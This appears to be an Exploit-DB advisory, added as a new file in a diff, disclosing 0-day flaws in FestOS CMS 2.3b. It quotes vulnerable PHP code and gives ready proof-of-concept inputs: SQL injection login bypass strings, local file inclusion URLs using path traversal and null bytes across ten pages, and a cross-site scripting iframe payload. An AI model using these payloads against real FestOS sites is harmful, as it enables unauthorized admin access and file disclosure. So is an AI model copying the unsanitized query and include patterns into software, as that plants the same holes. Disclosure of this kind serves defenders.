@@ -1,0 +1,95 @@
+'''
+  __  __  ____         _    _ ____  
+ |  \/  |/ __ \   /\  | |  | |  _ \ 
+ | \  / | |  | | /  \ | |  | | |_) |
+ | |\/| | |  | |/ /\ \| |  | |  _ <  Day 9 (0day)
+ | |  | | |__| / ____ \ |__| | |_) |
+ |_|  |_|\____/_/    \_\____/|____/ 
+
+ http://www.exploit-db.com/moaub-9-festos-cms-2-3b-multiple-remote-vulnerabilities/
+ '''
+ 
+Title  : FestOS CMS 2.3b Multiple Remote Vulnerabilities
+Affected Version : <=2.3b
+Vendor  Site   : http://festengine.org/
+ 
+Discovery : abysssec.com
+ 
+ 
+Description :
+ 
+This CMS have many critical vulnerability that we refere to some of those here:
+ 
+ 
+Vulnerabilites :
+ 
+1- SQL Injection
+ 
+Vulnerability :
+
+1.1- in admin/do_login.php line 17:
+
+// Process the login
+$query = "SELECT userid, roleID, username FROM ".$config['dbprefix']."users WHERE LCASE(username) = '".strtolower($_POST['username'])."' and password ='".md5($_POST['password'])."'";
+$res = $festos->query($query);
+
+poc: in admin.php page: 
+username: admin' or '1'='1 	
+password: admin' or '1'='1
+ 
+1.2- in festos_z_dologin.php:
+$query = "SELECT vendorID FROM ".$config['dbprefix']."vendors WHERE LCASE(email) = '".strtolower($_POST['email'])."' and password ='".$_POST['password']."'";
+
+poc: in applications.php page:
+email: anything
+pass: a' or 1=1/*
+
+2- Local File Inclusion (lfi):
+
+Vulnerability in index.php:
+
+line 41:
+
+if(isset($_GET['theme']) && !empty($_GET['theme']) && file_exists($config['ABSOLUTE_FILE_PATH'].'themes/'.$_GET['theme'])) {
+...
+require_once($themepath.'/includes/header.php');
+
+poc:
+http://localhost/festos/index.php?theme=../admin/css/admin.css%00
+http://localhost/festos/artists.php?theme=../admin/css/admin.css%00
+http://localhost/festos/contacts.php?theme=../admin/css/admin.css%00
+http://localhost/festos/applications.php?theme=../admin/css/admin.css%00
+http://localhost/festos/entertainers.php?theme=../admin/css/admin.css%00
+http://localhost/festos/exhibitors.php?theme=../admin/css/admin.css%00
+http://localhost/festos/foodvendors.php?theme=../admin/css/admin.css%00
+http://localhost/festos/performanceschedule.php?theme=../admin/css/admin.css%00
+http://localhost/festos/sponsors.php?theme=../admin/css/admin.css%00
+http://localhost/festos/winners.php?theme=../admin/css/admin.css%00
+ 
+3- Cross Site Scripting:
+
+in foodvendors.php, festos_foodvendors.php page has been included. 
+
+lines 31-36.
+
+switch($switcher) {
+	case 'details':
+		if(!isset($_GET['vendorID']) || ctype_digit($_GET['vendorID'])===FALSE || $_GET['vendorID'] == '') {
+			$template = 'foodvendors_nonespecified.tpl';
+			break;
+		}
+and in line 74:
+$tpl->set('vType', $_GET['category']);
+
+and foodvendors_nonespecified.tpl
+
+line 123:
+
+<p>Back to the list of <a href="<?php echo $_SERVER['PHP_SELF'];?>?view=list&vTypeID=<?php echo $vTypeID;?>" title="<?php echo $vType;?> Category">exhibitors in the <?php echo $vType;?> category</a>.</p>
+
+the category parameter is vulnerable to xss:
+poc:
+http://localhost/festos/foodvendors.php?view=details&vendorID=4&category=%3Ciframe%20src=javascript:alert%28%22XSS%22%29;&vTypeID=28
+
+
+
